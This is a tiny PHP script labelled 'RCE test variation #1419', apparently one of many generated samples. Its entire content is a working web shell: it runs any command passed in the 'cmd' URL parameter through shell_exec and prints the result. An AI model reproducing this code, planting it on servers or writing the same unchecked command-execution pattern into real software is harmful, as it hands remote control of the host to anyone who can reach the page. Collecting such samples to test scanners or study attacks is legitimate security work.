<?php
// RCE test variation #1419
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>